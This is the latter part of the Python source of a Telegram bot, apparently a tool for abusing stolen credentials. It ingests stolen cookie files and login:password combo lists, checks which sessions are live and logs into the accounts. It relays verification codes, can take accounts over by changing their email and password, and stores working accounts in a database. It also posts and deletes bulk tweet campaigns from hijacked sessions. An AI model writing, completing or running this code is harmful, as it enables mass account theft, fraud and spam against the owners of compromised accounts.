            z.writestr("summary.txt", "posted " + str(len(links)) + " | fail " + str(len(failed))
                       + "\nbatch " + batch_id)
        await _send_zip(u, op, "evilmarkhors_tweet.zip",
                        "Done | posted " + str(len(links)) + " | fail " + str(len(failed))
                        + "\n/delbatch " + batch_id)
        if links:
            chunk = ""
            for line in links:
                if len(chunk) + len(line) > 3500:
                    await u.message.reply_text(chunk)
                    chunk = ""
                chunk += line + "\n"
            if chunk:
                await u.message.reply_text(chunk)
        await _edit(msg, "Complete")
    except Exception as e:
        logging.exception("tweet batch")
        await _edit(msg, "Error: " + str(e))
    finally:
        TWEET.pop(uid, None)
        shutil.rmtree(tmp, ignore_errors=True)


async def del_batch(uid, u, bid):
    path = os.path.join(DEL_DIR, os.path.basename(uid + "_" + bid + ".json"))
    if not os.path.exists(path):
        await u.message.reply_text("Batch nahi mila: " + bid)
        return
    with open(path, encoding="utf-8") as f:
        items = json.load(f)
    msg = await u.message.reply_text("Deleting " + str(len(items)) + "...")
    deleted = fail = 0
    async with httpx.AsyncClient(follow_redirects=True) as client:
        for it in items:
            ck = cookie_dict(it.get("cookies") or [])
            if not ck:
                fail += 1
                continue
            n = await delete_ids(client, ck, it.get("ids") or [])
            deleted += n
            if n == 0:
                fail += 1
            await asyncio.sleep(2)
    await _edit(msg, "Deleted " + str(deleted) + " | fail " + str(fail))


async def delbatches_cmd(u, c):
    uid = str(u.effective_user.id)
    if not is_admin(uid):
        await u.message.reply_text("Sirf admin.")
        return
    if not os.path.isdir(DEL_DIR):
        await u.message.reply_text("Koi batch nahi.")
        return
    rows = []
    for fn in sorted(os.listdir(DEL_DIR)):
        if fn.startswith(uid + "_") and fn.endswith(".json"):
            bid = fn[len(uid) + 1:-5]
            try:
                with open(os.path.join(DEL_DIR, fn), encoding="utf-8") as f:
                    n = len(json.load(f))
            except Exception:
                n = 0
            rows.append(bid + " -> " + str(n))
    await u.message.reply_text("Batches:\n" + "\n".join(rows) + "\n\n/delbatch <id>"
                               if rows else "Koi saved batch nahi.")


async def delbatch_cmd(u, c):
    uid = str(u.effective_user.id)
    if not is_admin(uid):
        await u.message.reply_text("Sirf admin.")
        return
    if not c.args:
        await u.message.reply_text("Batch id do.")
        return
    await del_batch(uid, u, c.args[0].strip())


async def broadcast_cmd(u, c):
    if not is_admin(u.effective_user.id):
        await u.message.reply_text("Sirf admin.")
        return
    text = " ".join(c.args)
    if not text:
        await u.message.reply_text("Text do.")
        return
    sent = fail = 0
    bot = u.get_bot()
    for uid in list(_store.keys()):
        try:
            await bot.send_message(int(uid), text)
            sent += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)
    await u.message.reply_text("Sent " + str(sent) + " | fail " + str(fail))


async def countrytest_cmd(u, c):
    if not is_admin(u.effective_user.id):
        await u.message.reply_text("Sirf admin.")
        return
    CTEST.add(str(u.effective_user.id))
    await u.message.reply_text("Ek cookie .txt bhejo.")


async def country_test(u, doc):
    tmp = tempfile.mkdtemp(prefix="ct_")
    p = os.path.join(tmp, "c.txt")
    try:
        f = await doc.get_file()
        await f.download_to_drive(p)
        with open(p, encoding="utf-8", errors="ignore") as fh:
            data, cookies = parse_cookie_file(fh.read())
        if not cookies:
            await u.message.reply_text("Cookie lines nahi mili.")
            return
        async with httpx.AsyncClient(follow_redirects=True) as client:
            cc = await detect_country(client, cookie_dict(cookies))
        await u.message.reply_text("Country: " + (cc or "(nahi mila)")
                                   + "\nuser: " + str(data.get("Username", "")))
    except Exception as e:
        await u.message.reply_text("Error: " + str(e))
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


async def on_media(u, c):
    uid = str(u.effective_user.id)
    msg = u.message
    tgf = kind = mime = None
    if msg.photo:
        tgf, kind, mime = msg.photo[-1], "image", "image/jpeg"
    elif msg.video:
        tgf, kind, mime = msg.video, "video", (msg.video.mime_type or "video/mp4")
    elif msg.document:
        mt = msg.document.mime_type or ""
        if mt.startswith("image/"):
            tgf, kind, mime = msg.document, "image", mt
        elif mt.startswith("video/"):
            tgf, kind, mime = msg.document, "video", mt
    if not tgf:
        return
    cfg = CAMPS.get(uid)
    if cfg and cfg.get("stage") == "media":
        path = os.path.join(camp_media_dir(uid), str(int(time.time() * 1000)) + "_" + kind)
        try:
            f = await tgf.get_file()
            await f.download_to_drive(path)
            cfg["media"].append({"path": path, "mime": mime,
                                 "category": "tweet_image" if kind == "image" else "tweet_video"})
            save_camp(uid)
            await u.message.reply_text(kind + " add (" + str(len(cfg["media"])) + ").")
        except Exception as e:
            await u.message.reply_text("Media error: " + str(e))
        return
    t = TWEET.get(uid)
    if not t or t["stage"] != "content":
        return
    if t.get("tmp"):
        shutil.rmtree(t["tmp"], ignore_errors=True)
    tmp = tempfile.mkdtemp(prefix="twm_")
    path = os.path.join(tmp, "media")
    try:
        f = await tgf.get_file()
        await f.download_to_drive(path)
        TWEET[uid]["media"] = {"path": path, "mime": mime,
                               "category": "tweet_image" if kind == "image" else "tweet_video"}
        TWEET[uid]["tmp"] = tmp
        if msg.caption:
            TWEET[uid]["variants"].append(msg.caption)
        await u.message.reply_text(kind + " set. Aur bhejo ya /tweetgo.")
    except Exception as e:
        await u.message.reply_text("Media error: " + str(e))


def detect_mode(text, forced):
    if forced in ("cookies", "ulp", "verify"):
        return forced
    n = sum(1 for l in text.splitlines() if len(l.split("\t")) >= 7)
    return "cookies" if n >= 3 else "ulp"


async def _hard_clear(uid, keep_tmp=False):
    for v in PEND.get(uid, {}).values():
        try:
            await v["client"].aclose()
        except Exception:
            pass
    PEND.pop(uid, None)
    b = BATCH.pop(uid, None)
    if b and not keep_tmp:
        shutil.rmtree(b["tmp"], ignore_errors=True)
    clear_batch_file(uid)


async def ask_store(msg, st):
    st["msg"] = msg
    await msg.edit_text(
        "File mili: " + str(st["count"]) + " account(s)\n\n"
        "Sirf check karke file wapas, ya working accounts DB mein bhi add karne hain?",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("Sirf file", callback_data="store:file"),
            InlineKeyboardButton("File + DB", callback_data="store:both"),
            InlineKeyboardButton("Sirf DB", callback_data="store:db")],
            [InlineKeyboardButton("Cancel", callback_data="store:no")]]))


async def on_store_cb(u, c):
    q = u.callback_query
    await q.answer()
    uid = str(u.effective_user.id)
    st = STORE_ASK.pop(uid, None)
    if not st:
        await q.edit_message_text("Expire ho gayi, file dobara bhejo.")
        return
    choice = q.data.split(":", 1)[1]
    if choice == "no":
        shutil.rmtree(st["tmp"], ignore_errors=True)
        await q.edit_message_text("Cancel.")
        return
    await q.edit_message_text("Choice: " + choice + "\nChal raha hoon...")
    await process_with_store(u, uid, st, choice)


async def process_with_store(u, uid, st, choice):
    tmp, ip, is_zip, live = st["tmp"], st["ip"], st["is_zip"], st["live"]
    msg = st.get("msg")
    sink = []
    op = os.path.join(tmp, "out.zip")
    want_db = choice in ("db", "both") and db_enabled()
    want_file = choice in ("file", "both")
    try:
        prog = Progress(msg, 1, "COOKIES")
        prog.phase = "Rework + verify"
        if is_zip:
            await process_cookie_zip(ip, op, live, prog, sink if want_db else None, uid)
        else:
            with open(ip, encoding="utf-8", errors="ignore") as fh:
                text = fh.read()
            async with httpx.AsyncClient(follow_redirects=True) as client:
                out, data, cookies = await rework_cookie(text, client, live, asyncio.Semaphore(1))
            if want_db and data.get("Status") == "LIVE" and cookies:
                row = db_row_from(data, cookie_dict(cookies), uid)
                if row:
                    sink.append(row)
            with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
                z.writestr("reworked.txt", out)
            prog.ok = prog.done = 1
            await prog.update(force=True)
        db_ok, db_err = 0, None
        if want_db and sink:
            async with httpx.AsyncClient(follow_redirects=True) as client:
                db_ok, db_err = await db_upsert(client, sink)
        cap = "ok " + str(prog.ok) + " | fail " + str(prog.fail)
        if want_db:
            cap += "\nDB added: " + str(db_ok) + (" (" + db_err + ")" if db_err else "")
        if want_file:
            await _send_zip(u, op, "evilmarkhors_cookies.zip", cap)
        else:
            await u.message.reply_text("Done\n" + cap)
        await _edit(msg, "Complete")
    except Exception as e:
        logging.exception("process_with_store")
        await _edit(msg, "Error: " + str(e))
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


async def handle_file(u, c, doc):
    uid = str(u.effective_user.id)
    g = ucfg(uid)
    msg = await u.message.reply_text("File mili - shuru...")
    try:
        if uid in BATCH:
            if time.time() - BATCH[uid].get("started", time.time()) < 60:
                await _edit(msg, "Pehla batch chal raha hai. /cancel ya /finalize.")
                return
            await _hard_clear(uid)
        name = (doc.file_name or "").lower()
        is_zip = name.endswith(".zip")
        tmp = tempfile.mkdtemp(prefix="em_")
        ip = os.path.join(tmp, "in" + (".zip" if is_zip else ".txt"))
        BATCH[uid] = {"tmp": tmp, "msg": msg, "mode": "?", "takeover": g["takeover"],
                      "newpass": g["newpass"], "newemail": g["newemail"],
                      "results": [], "lines": [], "ok": 0, "fail": 0, "started": time.time()}
        for attempt in range(3):
            try:
                await _edit(msg, "Download... try " + str(attempt + 1))
                f = await doc.get_file()
                await f.download_to_drive(ip)
                break
            except Exception:
                if attempt == 2:
                    raise
                await asyncio.sleep(2)
        if is_zip:
            with zipfile.ZipFile(ip) as z:
                sample, cnt = "", 0
                for n in z.namelist():
                    if n.lower().endswith(".txt"):
                        cnt += 1
                        if cnt <= 3:
                            sample += z.read(n).decode("utf-8", "ignore")
        else:
            with open(ip, encoding="utf-8") as fh:
                sample = fh.read()
            cnt = 1
        mode = detect_mode(sample, g["mode"])
        BATCH[uid]["mode"] = mode
        if mode in ("cookies", "verify"):
            smode = get_store_mode(uid)
            if mode == "verify" and is_zip:
                op = os.path.join(tmp, "out.zip")
                prog = Progress(msg, 0, "VERIFY")
                prog.phase = "Checking"
                sink = [] if smode in ("db", "both") and db_enabled() else None
                await process_verify(ip, op, True, prog, sink, uid)
                cap = "Verify | live " + str(prog.ok) + " | dead " + str(prog.fail)
                if sink is not None:
                    async with httpx.AsyncClient(follow_redirects=True) as client:
                        n, e = await db_upsert(client, sink)
                    cap += "\nDB added: " + str(n) + (" (" + e + ")" if e else "")
                await _send_zip(u, op, "evilmarkhors_verify.zip", cap)
                await _edit(msg, "Complete")
                await _hard_clear(uid)
                return
            cfg = SPLIT.get(uid)
            if cfg and is_zip:
                op = os.path.join(tmp, "out.zip")
                prog = Progress(msg, 0, "SPLIT")
                prog.phase = "Bucket: " + cfg["field"]
                await process_split(ip, op, cfg, g["live"], prog)
                await _send_zip(u, op, "evilmarkhors_split.zip",
                                "Split | ok " + str(prog.ok) + " | unmatched " + str(prog.fail))
                await _edit(msg, "Complete")
                await _hard_clear(uid)
                return
            if smode == "ask":
                st = {"tmp": tmp, "ip": ip, "is_zip": is_zip, "live": g["live"], "count": cnt}
                STORE_ASK[uid] = st
                await _edit(msg, "Download ho gayi.")
                await ask_store(u, uid, st)
                await _hard_clear(uid)
                return
            st = {"tmp": tmp, "ip": ip, "is_zip": is_zip, "live": g["live"],
                  "count": cnt, "msg": msg}
            await _hard_clear(uid)
            await process_with_store(u, uid, st, smode)
            return
        lines = []
        if is_zip:
            with zipfile.ZipFile(ip) as z:
                for n in z.namelist():
                    if n.lower().endswith(".txt"):
                        lines += [l for l in z.read(n).decode("utf-8", "ignore").splitlines()
                                  if l.strip()]
        else:
            with open(ip, encoding="utf-8") as fh:
                lines = [l for l in fh.read().splitlines() if l.strip()]
        if not lines:
            await _edit(msg, "Koi line nahi mili.")
            await _hard_clear(uid)
            return
        prog = Progress(msg, len(lines), "ULP process")
        prog.phase = "Login + verify"
        await run_ulp_batch(uid, lines, prog)
        await after_batch(uid, u, msg)
    except Exception as e:
        logging.error("handle_file\n%s", traceback.format_exc())
        await _edit(msg, "Error: " + str(e) + "\n/cancel karke dobara try karo.")
        if uid in BATCH and not PEND.get(uid):
            await _hard_clear(uid)


async def after_batch(uid, u, msg):
    b = BATCH.get(uid)
    if not b:
        return
    pend = PEND.get(uid, {})
    if pend:
        rows = [b["lines"][int(k)].split(":")[0] + " -> " + v["kind"]
                for k, v in list(pend.items())[:40]]
        await _edit(msg, "ok " + str(b["ok"]) + " | fail " + str(b["fail"]) + " | code " + str(len(pend)))
        await u.message.reply_text(str(len(pend)) + " ko code chahiye:\n\n" + "\n".join(rows)
                                   + "\n\nBhejo: username code. Baad mein /finalize.")
    else:
        await finalize_batch(uid, u)


async def finalize_batch(uid, u):
    b = BATCH.get(uid)
    if not b:
        await u.message.reply_text("Koi batch nahi.")
        return
    op = os.path.join(b["tmp"], "out.zip")
    build_zip(op, uid)
    succ = sum(1 for r in b["results"] if r and r.get("ok"))
    await _send_zip(u, op, "evilmarkhors_" + b["mode"] + ".zip",
                    "Done | ok " + str(succ) + " | fail " + str(b["fail"])
                    + " | pending " + str(len(PEND.get(uid, {}))) + "\n" + WEBSITE)
    await _hard_clear(uid)


async def on_text(u, c):
    uid = str(u.effective_user.id)
    txt = (u.message.text or "").strip()
    cfg = CAMPS.get(uid)
    if cfg and cfg.get("stage") == "text":
        if txt:
            cfg["roles"][cfg["role"]].append(txt)
            save_camp(uid)
        await u.message.reply_text(cfg["role"] + ": "
                                   + str(len(cfg["roles"][cfg["role"]])) + " variants.")
        return
    t = TWEET.get(uid)
    if t and t["stage"] == "content":
        if txt:
            TWEET[uid]["variants"].append(txt)
        await u.message.reply_text("Variant " + str(len(TWEET[uid]["variants"]))
                                   + " add. Aur bhejo ya /tweetgo.")
        return
    if t and t["stage"] == "cookies":
        await u.message.reply_text("Ab cookie zip bhejo.")
        return
    if uid not in BATCH or not PEND.get(uid):
        return
    b, pend = BATCH[uid], PEND[uid]
    byname = {b["lines"][int(k)].split(":")[0].strip().lower(): k for k in pend}
    pairs = []
    for line in txt.splitlines():
        parts = line.strip().split()
        if not parts:
            continue
        key = parts[0].strip().lower()
        if len(parts) >= 2 and key in byname:
            pairs.append((byname[key], parts[-1]))
        elif len(pend) == 1:
            pairs.append((list(pend.keys())[0], parts[-1]))
    if not pairs:
        await u.message.reply_text("Format: username code")
        return
    for key, code in pairs:
        st = pend.get(key)
        if not st:
            continue
        try:
            if st["kind"] == "login":
                r = await resume_login(st, code)
                if r == "more":
                    await u.message.reply_text((st["ulp"]["username"] or st["ulp"]["email"])
                                               + ": aur ek code.")
                    continue
                if r == "ok":
                    res = await finish_account(uid, st["idx"], st["ulp"], st["client"])
                    if res == "email_pending":
                        await u.message.reply_text((st["ulp"]["username"] or st["ulp"]["email"])
                                                   + ": email set, code bhejo.")
                    else:
                        b["ok"] += 1
                        await u.message.reply_text((st["ulp"]["username"] or st["ulp"]["email"])
                                                   + ": done")
                else:
                    b["results"][st["idx"]] = {"ok": False, "line": b["lines"][st["idx"]],
                                               "err": "code_failed"}
                    b["fail"] += 1
                del pend[key]
                save_batch(uid)
            elif st["kind"] == "email":
                ck = dict(st["client"].cookies)
                if await confirm_email(st["client"], ck, code):
                    res = b["results"][st["idx"]]
                    if b["takeover"]:
                        np = b["newpass"] or gen_pass()
                        if await change_pass(st["client"], ck, st["ulp"]["password"], np):
                            res["new_pass"] = np
                    b["ok"] += 1
                    del pend[key]
                    await st["client"].aclose()
                    save_batch(uid)
                else:
                    await u.message.reply_text("Code galat, dobara bhejo.")
        except Exception:
            logging.error("on_text\n%s", traceback.format_exc())
    if not pend:
        await u.message.reply_text("Sab codes mil gaye - finalize.")
        await finalize_batch(uid, u)
    else:
        await u.message.reply_text(str(len(pend)) + " pending. Baaki bhejo ya /finalize.")


async def finalize_cmd(u, c):
    await finalize_batch(str(u.effective_user.id), u)


async def cancel_cmd(u, c):
    await _hard_clear(str(u.effective_user.id))
    await u.message.reply_text("Cancel")


async def on_error(u, c):
    logging.error("HANDLER ERROR\n%s",
                  "".join(traceback.format_exception(None, c.error, c.error.__traceback__)))
    try:
        if u and u.effective_message:
            await u.effective_message.reply_text("Error: " + str(c.error))
    except Exception:
        pass


# ============================ MAIN ============================
async def post_init(app):
    load_batches()
    load_camps()
    for uid in list(BATCH.keys()):
        try:
            await app.bot.send_message(int(uid), "Purana batch mila. /finalize ya /cancel.")
        except Exception:
            pass
    app.bot_data["rev"] = asyncio.create_task(reverify_loop(app))
    logging.info("reverify loop start (%sh)", REVERIFY_HOURS)


async def post_shutdown(app):
    t = app.bot_data.get("rev")
    if t:
        t.cancel()


async def on_doc(u, c):
    doc = u.message.document
    if not doc:
        return
    uid = str(u.effective_user.id)
    low = (doc.file_name or "").lower()
    if uid in CTEST and low.endswith(".txt"):
        CTEST.discard(uid)
        await country_test(u, doc)
        return
    cfg = CAMPS.get(uid)
    if cfg and cfg.get("stage") == "cookies" and low.endswith(".zip"):
        await run_campaign(u, c, doc)
        return
    ex = EXTRACT.get(uid)
    if ex and ex.get("stage") == "await" and low.endswith(".zip"):
        await run_extract(u, doc)
        return
    t = TWEET.get(uid)
    if t and t["stage"] == "cookies" and low.endswith(".zip"):
        await run_tweet_batch(u, doc)
        return
    await handle_file(u, c, doc)


def main():
    made = bootstrap()
    if made:
        print("Bani files:", ", ".join(made))
    if "--init" in sys.argv:
        return
    load_store()
    os.makedirs(CAMP_MEDIA_DIR, exist_ok=True)
    if not db_enabled():
        logging.warning("SUPABASE_URL/KEY missing - DB features off")
    app = (ApplicationBuilder().token(BOT_TOKEN).post_init(post_init)
           .post_shutdown(post_shutdown).build())
    handlers = [
        ("start", start), ("help", help_cmd), ("commands", commands_cmd),
        ("status", status_cmd), ("diag", diag_cmd), ("store", store_cmd),
        ("mode", mode_cmd), ("verify", verify_cmd), ("live", live_cmd),
        ("takeover", takeover_cmd), ("newpass", newpass_cmd), ("newemail", newemail_cmd),
        ("finalize", finalize_cmd), ("cancel", cancel_cmd),
        ("split", split_cmd), ("splitoff", splitoff_cmd), ("extract", extract_cmd),
        ("camp", camp_cmd), ("stopcamp", stopcamp_cmd), ("report", report_cmd),
        ("db", db_cmd), ("broadcast", broadcast_cmd), ("countrytest", countrytest_cmd),
        ("tweet", tweet_cmd), ("tweetgo", tweetgo_cmd), ("tweetcancel", tweetcancel_cmd),
        ("delbatches", delbatches_cmd), ("delbatch", delbatch_cmd),
    ]
    for cmd, fn in handlers:
        app.add_handler(CommandHandler(cmd, fn))
    app.add_handler(CallbackQueryHandler(on_store_cb, pattern=r"^store:"))
    app.add_handler(CallbackQueryHandler(on_cmd_cb, pattern=r"^cmdp:"))
    app.add_handler(MessageHandler(filters.PHOTO | filters.VIDEO, on_media))
    app.add_handler(MessageHandler(filters.Document.ALL, on_doc))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_error_handler(on_error)
    logging.info("Bot chalu | db=%s", db_enabled())
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
